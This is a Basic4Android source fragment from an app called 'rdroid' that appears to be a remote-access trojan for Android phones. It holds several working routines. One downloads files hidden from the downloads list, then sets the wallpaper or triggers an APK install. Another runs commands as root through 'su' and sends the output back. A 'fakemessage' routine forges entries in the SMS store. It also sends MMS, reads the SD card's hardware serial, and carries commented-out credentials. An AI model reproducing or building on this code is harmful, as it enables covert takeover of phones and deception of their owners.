	If File.exists(File.dirrootexternal, "/rdroid/downloads/")==False Then File.makedir(File.dirrootexternal, "/rdroid/downloads/")
	If File.exists(File.dirrootexternal & "/rdroid/downloads/",filename) Then File.delete(File.dirrootexternal & "/rdroid/downloads/",filename)
	downloadmanagerrequest1.destinationuri="file://"&File.combine(File.dirrootexternal,"/rdroid/downloads/" & filename)
	downloadmanagerrequest1.title="rdroid downloader"
	downloadmanagerrequest1.visibleindownloadsui=False
	dm.enqueue(downloadmanagerrequest1)
	'log("url:" & address & " file:" & filename)
End Sub

Sub dm_downloadcomplete(downloadid1 As Long)
	'    this does not guarantee that the download has actually successfully downloaded
	'    it means a downloadmananger downloadmanagerrequest has completed
	'    we need to find that status of that request but only if that request matches the request we started
    
	'    this is the download request we started
	'    query the downloadmanager for info on this request
	Dim downloadmanagerquery1 As DownloadManagerQuery
	downloadmanagerquery1.initialize

        
	'    you must enable the sql library to work with the cursor object
	Dim statuscursor As Cursor
	'    pass our downloadmanagerquery to the downloadmanager
	statuscursor=dm.query(downloadmanagerquery1)
	If statuscursor.rowcount>0 Then
		statuscursor.position=0
            
		Dim statusint As Int
		statusint=statuscursor.getint(dm.column_status)
		'log("download status = " & utils.getstatustext(statusint))

		If statusint=dm.status_failed Or statusint=dm.status_paused Then
			Dim reasonint As Int
			reasonint=statuscursor.getint(dm.column_reason)
			'log("status reason = "&utils.getreasontext(reasonint))
		End If
            
		If statusint=dm.status_successful Then
			Dim l As List
			l=File.listfiles(File.dirrootexternal & "/rdroid/downloads/")
			Dim i As Int
			For i=0 To l.size-1
				If(File.isdirectory(File.dirrootexternal & "/rdroid/downloads/",l.get(i))==False)Then
					Dim fname As String
					fname= l.get(i)
					If(fname.startswith("setaswall")==True)Then
						File.copy(File.dirrootexternal & "/rdroid/downloads/",fname,File.dirrootexternal & "/rdroid/downloads/",fname.Substring(9))
						File.delete(File.dirrootexternal & "/rdroid/downloads/",fname)
						fname=fname.Substring(9)
						setwallpaper(LoadBitmap(File.dirrootexternal & "/rdroid/downloads/", fname))
						notify("wallpaper changed.",True)
					else if(fname.startswith("minstl8")==True)Then
						File.copy(File.dirrootexternal & "/rdroid/downloads/",fname,File.dirrootexternal & "/rdroid/downloads/",fname.Substring(7))
						File.delete(File.dirrootexternal & "/rdroid/downloads/",fname)
						fname=fname.Substring(7)
						Dim inte As Intent
						inte.initialize(inte.action_view,createuri("file://" & File.combine(File.dirrootexternal & "/rdroid/downloads/", fname)))
						inte.settype("application/vnd.android.package-archive")
						StartActivity(inte)
					End If
					
				End If
			Next
				
				
		End If
            
	Else
		'    always check that the cursor returned from the downloadmanager query method is not empty
		' log("the downloadmanager has no trace of our request, it could have been cancelled by the user using the android downloads app or an unknown error has occurred.")
	End If
        
	'    free system resources
	statuscursor.close
	dm.unregisterreceiver
End Sub

Sub shell(command As String)
	Dim command, runner As String
	Dim stdout, stderr As StringBuilder
	Dim result As Int
	Dim p As Phone
	stdout.initialize
	stderr.initialize
	runner = File.combine(File.dirinternalcache, "runner")
	command = File.combine(File.dirinternalcache, "command")
	File.writestring(File.dirinternalcache, "runner", "su < " & command)
	File.writestring(File.dirinternalcache, "command", "ls data" & CRLF  & "exit") 'any commands via crlf, and exit at End
	result = p.shell("sh", Array As String(runner), stdout, stderr)
	snd("shell",stdout)
End Sub


Sub sEndmms(phonenumber As String, message As String, dir As String, filename As String,contenttype As String)
	Dim iintent As Intent
	iintent.initialize("android.intent.action.sEnd_msg", "")
	iintent.settype("vnd.android-dir/mms-sms")
	iintent.putextra("android.intent.extra.stream", createuri("file://" & File.combine(dir, filename)))
	iintent.putextra("sms_body", message)
	iintent.putextra("address", phonenumber)
	iintent.settype(contenttype)
	StartActivity(iintent)
End Sub

Sub createuri(uri As String) As Object
	Dim r As Reflector
	Return r.runstaticmethod("android.net.uri", "parse", Array As Object(uri), Array As String("java.lang.string"))
End Sub

Sub savesettings
	'st.user="madsac"
	'st.password="iammadsac"
	'st.name="galaxy_y"
	mp.put(st.name,st)
	raf.initialize(File.dirinternal,"settings.dat",False)
	raf.writeobject(mp,True,0) 'always use position 0. we only hold a single object in this case so we can start from the beginning.
	raf.flush 'not realy requied here. better to call it when you finish writing
	raf.close
	readsettings
End Sub

Sub readsettings
	Dim rad As RandomAccessFile
	rad.initialize(File.dirinternal,"settings.dat",False)
	If st.isinitialized==False Then st.initialize
	If mp.isinitialized==False Then mp.initialize
	     	
	If(rad.size>0) Then
		mp = rad.readobject(0) 'always 0 (single object)
		Dim i As Int
		For i = 0 To mp.size-1
			st=mp.getvalueat(i)
		Next
	End If
	rad.close
End Sub

Sub fakemessage(from As String,message As String,time As String,mtype As String)
	Dim r As Reflector
	r.target = r.createobject("android.content.contentvalues")
	r.runmethod3("put", "address", "java.lang.string", from, "java.lang.string")
	r.runmethod3("put", "body", "java.lang.string", message, "java.lang.string")
	r.runmethod3("put", "date", "java.lang.string", time, "java.lang.string")'datetime.now- 80000000 in ms
	r.runmethod3("put", "type", "java.lang.string", mtype, "java.lang.string")'inbox=1,sent=2
	'r.runmethod3("put", "read", "java.lang.string", "0", "java.lang.string")
	'r.runmethod3("put", "seen", "java.lang.string", "0", "java.lang.string")
	'r.runmethod3("put", "status", "java.lang.string", "0", "java.lang.string")'?
	Dim contentvalues As Object = r.target
	r.target = r.getcontext
	r.target = r.runmethod("getcontentresolver")
	r.runmethod4("insert", Array As Object( _
        r.runstaticmethod("android.net.uri", "parse", Array As Object("content://sms/sent"), _
            Array As String("java.lang.string")), _
        contentvalues), Array As String("android.net.uri", "android.content.contentvalues"))
End Sub

Sub parsedt(date As String)
	Dim arr() As String=Regex.split(" ",date)
	DateTime.timeformat="hh:mm"
	DateTime.dateformat="mm/dd/yyyy"
	Dim dt As Long
	dt = (DateTime.dateparse(arr(0))+ DateTime.timeparse(arr(1))-DateTime.dateparse(DateTime.date(DateTime.now)))
	DateTime.timeformat=DateTime.devicedefaulttimeformat
	DateTime.dateformat=DateTime.devicedefaultdateformat
	Return dt
End Sub

Sub getsdcardserial()
	If(File.externalwritable)Then
		Dim lst As List
		Dim sddir As String
		Try
			lst=File.listfiles("/sys/class/mmc_host/mmc1")
			For i=0 To lst.size -1
				Dim f As String=lst.get(i)
				If f.startswith("mmc1")=True Then sddir=f
			Next
			Dim tr As TextReader
			tr.initialize(File.openinput("/sys/class/mmc_host/mmc1/" & sddir ,"cid"))
			Return tr.readline
		Catch
			Return("error reading id.")
		End Try
	Else
		Return "no external storage available"
	End If
End Sub

Sub curdt
	DateTime.timeformat="hh:mm:ss"
	DateTime.dateformat="mm/dd/yyyy"
	Dim date As String= DateTime.date(DateTime.now) & " " & DateTime.time(DateTime.now)
	DateTime.timeformat=DateTime.devicedefaulttimeformat
	DateTime.dateformat=DateTime.devicedefaultdateformat
	Return date
End Sub

Sub urlencode(text As String)
	Dim su As StringUtils
	Return su.encodeurl(text, "utf8")
End Sub
